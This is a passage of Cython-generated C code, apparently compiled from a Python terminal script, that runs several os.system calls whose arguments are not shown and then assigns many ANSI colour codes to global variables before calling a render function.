      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_2);

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 191, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 191, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 191, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 192, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 192, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 192, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 193, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 193, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 193, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 194, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 194, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 194, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 195, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 195, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 195, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 196, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 196, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 196, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 197, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 198, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 198, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__46, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 198, __pyx_L12_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L11_exception_handled;
    }
    goto __pyx_L12_except_error;
    __pyx_L12_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L11_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L15_try_end:;
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 200, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 201, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 202, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 203, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 204, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 205, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 206, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_y, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 207, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 208, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_z, __pyx_kp_u_3_33m) < 0) __PYX_ERR(0, 209, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 210, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 211, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DS, __pyx_kp_u_30m) < 0) __PYX_ERR(0, 212, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_V, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 213, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 214, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 215, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 216, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 217, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 218, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 219, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 220, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 221, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 222, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 223, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 224, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 225, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 226, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 227, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 228, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BL, __pyx_kp_u_38_5_21m) < 0) __PYX_ERR(0, 229, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_YU, __pyx_kp_u_38_5_200m) < 0) __PYX_ERR(0, 230, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_w, __pyx_int_0) < 0) __PYX_ERR(0, 232, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_int_0) < 0) __PYX_ERR(0, 233, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_r_2, __pyx_int_0) < 0) __PYX_ERR(0, 234, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_t, __pyx_int_0) < 0) __PYX_ERR(0, 235, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_a, __pyx_int_0) < 0) __PYX_ERR(0, 236, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_s, __pyx_int_0) < 0) __PYX_ERR(0, 237, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_y, __pyx_int_0) < 0) __PYX_ERR(0, 238, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_u, __pyx_int_0) < 0) __PYX_ERR(0, 239, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_int_0) < 0) __PYX_ERR(0, 240, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_o, __pyx_int_0) < 0) __PYX_ERR(0, 241, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_p, __pyx_int_0) < 0) __PYX_ERR(0, 242, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 243, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 244, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 245, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 246, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 247, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 248, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 249, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 250, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 251, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 252, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 253, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 254, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 255, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 256, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 257, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 258, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 259, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 260, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 261, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 262, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 263, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 264, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 265, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 266, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C1, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 267, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 268, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 269, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BRed, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 270, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BGreen, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 271, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BYellow, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 272, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 273, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BPurple, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 274, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BCyan, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 275, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BWhite, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 276, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 278, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 279, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 280, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 281, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 282, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 283, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 284, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 285, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 286, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 287, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 288, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 289, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 290, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 291, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 292, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 293, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C1, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 294, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 295, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B_2, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 296, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_K, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 297, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 298, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 299, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 300, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 301, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 302, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 303, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 304, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 305, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 306, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 307, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 308, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 309, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 310, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 311, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 312, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 313, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BYellow, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 314, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 315, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 316, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 317, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 318, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 319, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 320, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 321, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_y, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 322, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 323, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_z, __pyx_kp_u_3_33m) < 0) __PYX_ERR(0, 324, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 325, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 326, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DS, __pyx_kp_u_30m) < 0) __PYX_ERR(0, 327, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_V, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 328, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 329, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 330, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 331, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 332, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 333, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 334, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 335, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 336, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 337, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 338, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 339, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 340, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 341, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 342, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 343, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BL, __pyx_kp_u_38_5_21m) < 0) __PYX_ERR(0, 344, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_YU, __pyx_kp_u_38_5_200m) < 0) __PYX_ERR(0, 345, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_render); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 346, __pyx_L1_error)
